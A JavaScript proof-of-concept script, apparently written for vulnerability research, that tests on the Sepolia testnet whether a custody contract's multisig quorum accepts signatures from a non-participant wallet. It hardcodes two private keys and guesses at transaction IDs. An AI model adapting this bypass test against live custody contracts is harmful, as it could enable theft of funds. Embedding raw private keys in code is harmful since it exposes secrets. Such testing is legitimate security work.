const { ethers } = require("ethers");

// === VERIFY: DOES A STRANGER'S SIGNATURE COUNT? ===

const RPC_URL = "https://ethereum-sepolia.publicnode.com";
const CUSTODY_ADDRESS = "0x815aeca64a974297942d2bbf034bd63eb638883d";
const OWNER_PK = "0xa12f4dc456a8fa989f093604e702384f9691f99c3242f615fc9a1ba0d3b3eaf2";    // Wallet 1
const STRANGER_PK = "0x66703806999048d288011123372530e7e54a85f56cb80397a59c5d6e2911c3a4"; // Wallet 2

const ABI = [
    "function createVault(bytes32 _creator) external",
    "function addParticipant(bytes32 _creator, bytes32 _participant, string _shard) external",
    "function defineQuorum(bytes32 _creator, uint256 _minParticipants) external",
    "function promptSignatures(bytes32 _creator) external",
    "function signTransaction(bytes32 _creator, bytes32 _participant, uint256 _tx) external",
    "function checkQuorum(bytes32 _creator, uint256 _txid) external view returns (bool)",
    "function getQuorum(bytes32 _creator) external view returns (uint256)"
];

async function run() {
    console.log("=== UNIVERSAL SIGNING VERIFICATION ===\n");

    const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
    const owner = new ethers.Wallet(OWNER_PK, provider);
    const stranger = new ethers.Wallet(STRANGER_PK, provider);

    const ownerContract = new ethers.Contract(CUSTODY_ADDRESS, ABI, owner);
    const strangerContract = new ethers.Contract(CUSTODY_ADDRESS, ABI, stranger);

    const vaultId = ethers.utils.formatBytes32String("SignTest" + Date.now());

    // 1. Create Vault
    console.log(`[1] Creating Vault: ${vaultId}`);
    await (await ownerContract.createVault(vaultId, { gasLimit: 500000 })).wait();

    // 2. Add Owner as Participant 1
    const p1 = ethers.utils.formatBytes32String("OwnerP");
    await (await ownerContract.addParticipant(vaultId, p1, "shard1", { gasLimit: 500000 })).wait();

    // 3. Define Quorum = 2
    console.log("[2] Setting Quorum to 2");
    await (await ownerContract.defineQuorum(vaultId, 2, { gasLimit: 500000 })).wait();

    // 4. Create Transaction (Tx ID 1)
    console.log("[3] Creating Transaction (Prompt)");
    await (await ownerContract.promptSignatures(vaultId, { gasLimit: 500000 })).wait();
    const txId = 1; // Assuming first tx is 1 (or 0?) - let's try 0 and 1, usually sequential or timestamp
    // Actually, promptSignatures doesn't return ID. Usually it's an incrementing counter.
    // Let's guess it's 0 or 1.

    // 5. Owner Signs (1 valid signature)
    console.log("[4] Owner Signs (Valid)");
    await (await ownerContract.signTransaction(vaultId, p1, txId, { gasLimit: 500000 })).wait();

    // 6. Check Quorum (Should be FALSE, 1/2)
    let isQuorum = await ownerContract.checkQuorum(vaultId, txId);
    console.log(`   Quorum Reached? ${isQuorum} (Expected: false)`);

    // 7. Stranger Signs (Invalid participant)
    console.log("[5] Stranger Signs (Attacker)");
    const strangerP = ethers.utils.formatBytes32String("Stranger");
    try {
        await (await strangerContract.signTransaction(vaultId, strangerP, txId, { gasLimit: 500000 })).wait();
        console.log("   Stranger signed successfully (Tx didn't revert)");
    } catch (e) {
        console.log("   Stranger blocked!");
    }

    // 8. Check Quorum Again
    isQuorum = await ownerContract.checkQuorum(vaultId, txId);
    console.log(`[6] Quorum Reached? ${isQuorum}`);

    if (isQuorum) {
        console.log("\nCRITICAL CONFIRMED: Stranger signature COUNTED towards quorum.");
        console.log("The contract logic is broken.");
    } else {
        console.log("\nIMPACT REDUCED: Stranger signature was ignored.");
        console.log("The vulnerability allows spamming signatures, but not bypassing security.");
    }
}

run().catch(console.error);
